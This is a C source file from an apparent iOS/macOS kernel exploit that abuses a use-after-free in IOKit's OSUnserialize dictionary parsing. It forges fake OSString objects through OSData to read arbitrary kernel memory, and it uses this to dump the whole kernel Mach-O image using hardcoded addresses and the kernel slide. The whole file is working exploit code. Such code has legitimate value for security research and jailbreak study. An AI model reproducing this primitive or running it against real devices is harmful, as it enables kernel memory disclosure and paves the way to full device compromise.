#include <errno.h>              // errno
#include <stddef.h>             // size_t
#include <stdint.h>             // uint32_t
#include <stdlib.h>             // malloc
#include <string.h>             // memset, strerror
#include <unistd.h>             // usleep

#include "common.h"             // ASSERT, DEBUG, PRINT_BUF, ADDR, MIN, addr_t, MACH_MAGIC, mach_hdr_t, mach_seg_t
#include "io.h"                 // MIG_MSG_SIZE, kOS*, OSString, vtab_t, dict_get_bytes
#include "slide.h"              // get_kernel_slide
#include "try.h"                // THROW, TRY, RETHROW, FINALLY

#include "uaf_read.h"

void uaf_get_bytes(const OSString *fake, char *buf, size_t len)
{
    DEBUG("Using UAF to read kernel bytes...");

    const uint32_t *data = (const uint32_t*)fake;
    PRINT_BUF("Data", data, sizeof(OSString));

    uint32_t buflen = (uint32_t)len;
    const char str[4] = "str",
               ref[4] = "ref",
               sav[4] = "sav";
    uint32_t dict[11 + sizeof(OSString) / sizeof(uint32_t)] =
    {
        kOSSerializeMagic,                                              // Magic
        kOSSerializeEndCollection | kOSSerializeDictionary | 6,         // Dictionary with 6 entries

        kOSSerializeString | 4,                                         // String that will get freed
        *((uint32_t*)str),
        kOSSerializeData | sizeof(OSString),                            // OSData with same size as OSString
#ifdef __LP64__
        data[0],                                                        // vtable pointer (lower half)
        data[1],                                                        // vtable pointer (upper half)
        data[2],                                                        // retainCount
        data[3],                                                        // flags
        data[4],                                                        // length
        data[5],                                                        // (padding)
        data[6],                                                        // string pointer (lower half)
        data[7],                                                        // string pointer (upper half)
#else
        data[0],                                                        // vtable pointer
        data[1],                                                        // retainCount
        data[2],                                                        // flags
        data[3],                                                        // length
        data[4],                                                        // string pointer
#endif

        kOSSerializeSymbol | 4,                                         // Name that we're gonne use to retrieve bytes
        *((uint32_t*)ref),
        kOSSerializeObject | 1,                                         // Reference to the overwritten OSString

        kOSSerializeSymbol | 4,                                         // Create a reference to the OSData to prevent it
        *((uint32_t*)sav),                                              // from being freed before the OSString, which
        kOSSerializeEndCollection | kOSSerializeObject | 2,             // would cause a panic (because heap poisoning).
    };
    PRINT_BUF("Dict", dict, sizeof(dict));

    dict_get_bytes(dict, sizeof(dict), ref, buf, &buflen);

    PRINT_BUF("Fetched bytes", (uint32_t*)buf, buflen);
}

void uaf_read_naive(const char *addr, char *buf, size_t len)
{
    DEBUG("Dumping kernel bytes " ADDR "-" ADDR "...", (addr_t)addr, (addr_t)(addr + len));

    size_t kslide = get_kernel_slide();
    OSString osstr =
    {
        .vtab = (vtab_t)(0xffffff80044ef1f0 + kslide),  // TODO: hardcoded
        .retainCount = 100,                             // don't try to free this
        .flags = kOSStringNoCopy,                       // and neither the "string" it points to
    };

    verbose = false;
    for(size_t off = 0; off < len; off += osstr.length)
    {
        osstr.length = len - off;
        osstr.length = osstr.length > MIG_MSG_SIZE ? MIG_MSG_SIZE : osstr.length;
        osstr.string = &addr[off];
        uaf_get_bytes(&osstr, &buf[off], osstr.length);
    }
    verbose = true;
}

// Optimized kernel bytes dumping.
// Open X clients with Y strings at once, then wait for
// async cleanup only once every X*Y*4096 bytes.
void uaf_read(const char *addr, char *buf, size_t len)
{
#define STR_LEN (sizeof(OSString) / sizeof(uint32_t))
#define ENT_LEN (9 + STR_LEN)
#define DICT_HEAD 8
#define NUM_CLIENTS 1
#define NUM_STRINGS 8
//#define NUM_STRINGS (MIG_MSG_SIZE / (ENT_LEN * sizeof(uint32_t)) - DICT_HEAD)

    static OSString osstr =
    {
        .vtab = NULL,               // Init value
        .retainCount = 100,         // high ref count -> don't accidentally free this
        .flags = kOSStringNoCopy,   // don't free or modify the "string"
    };
    static const uint32_t *data = (uint32_t*)&osstr;
    static uint32_t dict[DICT_HEAD + NUM_STRINGS * ENT_LEN] =
    {
        kOSSerializeMagic,                                                                          // Magic
        kOSSerializeEndCollection | kOSSerializeDictionary | (6 * NUM_STRINGS + 2),                 // Dict with lotsa strings

        kOSSerializeSymbol | 7,                                                                     // "siguza"
        's' | ('i' << 8) | ('g' << 16) | ('u' << 24),                                               // This serves both as mark to check
        'z' | ('a' << 8),                                                                           // that a userclient in the registry is
        kOSSerializeNumber | 64,                                                                    // one we spawned, as well as a mapping
        0,                                                                                          // from userclient to buffer offset.
        0,
    };

    DEBUG("Dumping kernel bytes " ADDR "-" ADDR "...", (addr_t)addr, (addr_t)(addr + len));

    // Once
    if(osstr.vtab == NULL)
    {
        osstr.vtab = (vtab_t)(0xffffff80044ef1f0 + get_kernel_slide());     // TODO: hardcoded
        for(uint32_t i = 0; i < NUM_STRINGS; ++i)
        {
            dict[DICT_HEAD + i * ENT_LEN    ] = kOSSerializeString | 4;                             // String that will get freed
            dict[DICT_HEAD + i * ENT_LEN + 1] = (i << 8) | 'A';                                     // Doesn't need to be an actual string
            dict[DICT_HEAD + i * ENT_LEN + 2] = kOSSerializeData | sizeof(OSString);                // OSData with size of OSString
#ifdef __LP64__
            dict[DICT_HEAD + i * ENT_LEN + 3] = data[0];                                            // vtable pointer (lower half)
            dict[DICT_HEAD + i * ENT_LEN + 4] = data[1];                                            // vtable pointer (upper half)
            dict[DICT_HEAD + i * ENT_LEN + 5] = data[2];                                            // retainCount
            dict[DICT_HEAD + i * ENT_LEN + 6] = data[3];                                            // flags
                                                                                                    // length will come later
            dict[DICT_HEAD + i * ENT_LEN + 8] = data[5];                                            // (padding)
                                                                                                    // string pointer will come later
#else
            dict[DICT_HEAD + i * ENT_LEN + 3] = data[0];                                            // vtable pointer
            dict[DICT_HEAD + i * ENT_LEN + 4] = data[1];                                            // retainCount
            dict[DICT_HEAD + i * ENT_LEN + 5] = data[2];                                            // flags
                                                                                                    // length will come later
                                                                                                    // string pointer will come later
#endif

            // Note: references don't get added to objsArray, so we have i * 4 instead of i * 6

            dict[DICT_HEAD + i * ENT_LEN + STR_LEN + 3] = kOSSerializeSymbol | 4;                   // Name to later retrieve bytes
            dict[DICT_HEAD + i * ENT_LEN + STR_LEN + 4] = (i << 8) | 'B';
            dict[DICT_HEAD + i * ENT_LEN + STR_LEN + 5] = kOSSerializeObject | (i * 4 + 3);         // Reference to the overwritten OSString

            dict[DICT_HEAD + i * ENT_LEN + STR_LEN + 6] = kOSSerializeSymbol | 4;                   // Whatever name
            dict[DICT_HEAD + i * ENT_LEN + STR_LEN + 7] = (i << 8) | 'C';
            dict[DICT_HEAD + i * ENT_LEN + STR_LEN + 8] = kOSSerializeObject | (i * 4 + 4);         // Prevent panic
        }
        dict[DICT_HEAD + (NUM_STRINGS - 1) * ENT_LEN + STR_LEN + 8] |= kOSSerializeEndCollection;   // Last entry gets an end flag
    }

    // Clean up any potential mess from a previous call
    dict[1] = kOSSerializeEndCollection | kOSSerializeDictionary | (6 * NUM_STRINGS + 2);           // Dictionary with n entries
    for(uint32_t i = 0; i < NUM_STRINGS - 1; ++i) // Last entry never needs clearing
    {
        dict[DICT_HEAD + i * ENT_LEN + STR_LEN + 8] &= ~kOSSerializeEndCollection;                  // Clear any possible end flag
    }

    verbose = false; // Madness off
    TRY
    ({
        io_service_t service = _io_get_service();
        io_connect_t client[NUM_CLIENTS];

        for(size_t off = 0; off < len;)
        {
            size_t c = 0;
            TRY
            ({
                // Offset to which we're gonna read in this iteration
                size_t it_off = off + MIN(len - off, MIG_MSG_SIZE * NUM_STRINGS * NUM_CLIENTS);

                verbose = true;
                DEBUG("Dumping " ADDR "-" ADDR "...", (addr_t)(addr + off), (addr_t)(addr + it_off));
                verbose = false;

                for(; c < NUM_CLIENTS && off < it_off; ++c)
                {
                    // Copy offset to dict
                    uint64_t uoff = off;
                    dict[6] = ((uint32_t*)&uoff)[0];
                    dict[7] = ((uint32_t*)&uoff)[1];

                    // Offset to which we're gonna read with this client
                    size_t cl_off = off + MIN(it_off - off, MIG_MSG_SIZE * NUM_STRINGS);

                    size_t s = 0;
                    //size_t xoff;
                    uint32_t slen;
                    //for(slen = 0, xoff = off; n < NUM_STRINGS && xoff < cl_off; ++n, xoff += slen)
                    for(s = 0, slen = 0; s < NUM_STRINGS && off < cl_off; ++s, off += slen)
                    {
                        slen = MIN(cl_off - off, MIG_MSG_SIZE);
                        const char *ptr = &addr[off];
                        const uint32_t *dat = (const uint32_t*)&ptr;
#ifdef __LP64__
                        dict[DICT_HEAD + s * ENT_LEN +  7] = slen;                                  // length
                        dict[DICT_HEAD + s * ENT_LEN +  9] = dat[0];                                // string pointer (lower half)
                        dict[DICT_HEAD + s * ENT_LEN + 10] = dat[1];                                // string pointer (upper half)
#else
                        dict[DICT_HEAD + s * ENT_LEN +  6] = slen;                                  // length
                        dict[DICT_HEAD + s * ENT_LEN +  7] = dat[0];                                // string pointer
#endif
                        if(off + slen >= len) // Last string in this function call
                        {
                            // Truncate dict
                            dict[1] = kOSSerializeEndCollection | kOSSerializeDictionary | (6 * (s + 1) + 2);
                            dict[DICT_HEAD + s * ENT_LEN + STR_LEN + 8] |= kOSSerializeEndCollection;
                        }
                    }

                    client[c] = _io_spawn_client(service, dict, (DICT_HEAD + s * ENT_LEN) * sizeof(*dict));
                    /*TRY
                    ({
                        for(uint32_t s = 0, slen = 0; s < NUM_STRINGS && off < cl_off; ++s, off += slen)
                        {
                            //uint32_t i = s * 3 + 1; // The "name" of our property
                            uint32_t i = (s << 8) | 'B'; // The "name" of our property
                            uint32_t buflen;
                            slen = buflen = MIN(cl_off - off, MIG_MSG_SIZE);
                            _io_get_bytes(service, (char*)&i, &buf[off], &buflen);
                        }
                    })
                    RETHROW
                    ({
                        _io_release_client(client[c]);
                    })*/
                }
                io_iterator_t it = _io_iterator(service);
                TRY
                ({
                    size_t cl = 0;
                    io_object_t o;
                    while((o = IOIteratorNext(it)) != 0)
                    {
                        uint64_t xoff;
                        uint32_t xofflen = sizeof(xoff);
                        if(IORegistryEntryGetProperty(o, "siguza", (char*)&xoff, &xofflen) == KERN_SUCCESS)
                        {
                            // Offset to which we're gonna read with this client
                            size_t cl_off = xoff + MIN(it_off - xoff, MIG_MSG_SIZE * NUM_STRINGS);

                            for(uint32_t s = 0, slen = 0; s < NUM_STRINGS && xoff < cl_off; ++s, xoff += slen)
                            {
                                uint32_t i = (s << 8) | 'B'; // The "name" of our property
                                uint32_t buflen;
                                slen = buflen = MIN(cl_off - xoff, MIG_MSG_SIZE);
                                _io_get(o, (char*)&i, &buf[xoff], &buflen);
                            }
                            ++cl;
                        }
                        IOObjectRelease(o);
                    }
                    if(cl != c)
                    {
                        THROW("Number of parsed and retrieved dicts differ (" SIZE ", " SIZE ")", c, cl);
                    }
                })
                FINALLY
                ({
                    IOObjectRelease(it);
                })
            })
            FINALLY
            ({
                for(; c > 0; --c) // No >= because unsigned
                {
                    _io_release_client(client[c - 1]);
                }
            })
            usleep(1000); // Async cleanup
        }
    })
    FINALLY
    ({
        verbose = true;
    })

#undef NUM_STRINGS
#undef NUM_CLIENTS
#undef DICT_HEAD
#undef ENT_LEN
#undef STR_LEN
}

void uaf_dump_kernel(file_t *file)
{
    DEBUG("Dumping kernel...");

    char *hbuf = malloc(MIG_MSG_SIZE),
         *newhbuf = malloc(MIG_MSG_SIZE);
    if(hbuf == NULL || newhbuf == NULL)
    {
        if(hbuf    != NULL) free(hbuf);
        if(newhbuf != NULL) free(newhbuf);
        THROW("Failed to allocate buffer (%s)", strerror(errno));
    }
    TRY
    ({
        memset(newhbuf, 0, MIG_MSG_SIZE);

        char *kbase = (char*)(0xffffff8004004000 + get_kernel_slide());
        uaf_read(kbase, hbuf, MIG_MSG_SIZE);

        mach_hdr_t *hdr = (mach_hdr_t*)hbuf;
        ASSERT(MACH_MAGIC == hdr->magic);
        memcpy(newhbuf, hbuf, sizeof(*hdr));
        mach_hdr_t *newhdr = (mach_hdr_t*)newhbuf;
        newhdr->ncmds = 0;
        newhdr->sizeofcmds = 0;

        size_t filesize = 0;
        DEBUG("Kernel segments:");
        for(mach_cmd_t *cmd = (mach_cmd_t*)&hdr[1], *end = (mach_cmd_t*)((char*)cmd + hdr->sizeofcmds); cmd < end; cmd = (mach_cmd_t*)((char*)cmd + cmd->cmdsize))
        {
            switch(cmd->cmd)
            {
                case LC_SEGMENT:
                case LC_SEGMENT_64:
                    {
                        mach_seg_t *seg = (mach_seg_t*)cmd;
                        size_t size = seg->fileoff + seg->filesize;
                        filesize = size > filesize ? size : filesize;
                        DEBUG("Mem: " ADDR "-" ADDR " File: " ADDR "-" ADDR "     %-31s", seg->vmaddr, seg->vmaddr + seg->vmsize, seg->fileoff, seg->fileoff + seg->filesize, seg->segname);
                        for(uint32_t i = 0; i < seg->nsects; ++i)
                        {
                            mach_sec_t *sec = &( (mach_sec_t*)&seg[1] )[i];
                            DEBUG("    Mem: " ADDR "-" ADDR " File: " ADDR "-" ADDR " %s.%-*s", sec->addr, sec->addr + sec->size, (addr_t)sec->offset, sec->offset + sec->size, sec->segname, (int)(30 - strlen(sec->segname)), sec->sectname);
                        }
                    }
                    break;
            }
        }

        DEBUG("Kernel file size: 0x%lx", filesize);
        char *buf = malloc(filesize);
        if(buf == NULL)
        {
            THROW("Failed to allocate buffer (%s)", strerror(errno));
        }
        TRY
        ({
            for(mach_cmd_t *cmd = (mach_cmd_t*)&hdr[1], *end = (mach_cmd_t*)((char*)cmd + hdr->sizeofcmds); cmd < end; cmd = (mach_cmd_t*)((char*)cmd + cmd->cmdsize))
            {
                switch(cmd->cmd)
                {
                    case LC_SEGMENT:
                    case LC_SEGMENT_64:
                        {
                            mach_seg_t *seg = (mach_seg_t*)cmd;
                            DEBUG("Dumping %s...", seg->segname);
                            uaf_read((char*)seg->vmaddr, &buf[seg->fileoff], seg->filesize);
                        }
                    case LC_UUID:
                    case LC_UNIXTHREAD:
                    case LC_VERSION_MIN_IPHONEOS:
                    case LC_FUNCTION_STARTS:
                    case LC_SOURCE_VERSION:
                        {
                            memcpy(newhbuf + sizeof(*hdr) + newhdr->sizeofcmds, cmd, cmd->cmdsize);
                            newhdr->sizeofcmds += cmd->cmdsize;
                            newhdr->ncmds++;
                        }
                        break;
                }
            }

            memcpy(buf, newhbuf, sizeof(*hdr) + hdr->sizeofcmds);
            file->buf = buf;
            file->len = filesize;
        })
        RETHROW
        ({
            free(buf);
        })
    })
    FINALLY
    ({
        free(hbuf);
        free(newhbuf);
    })
}
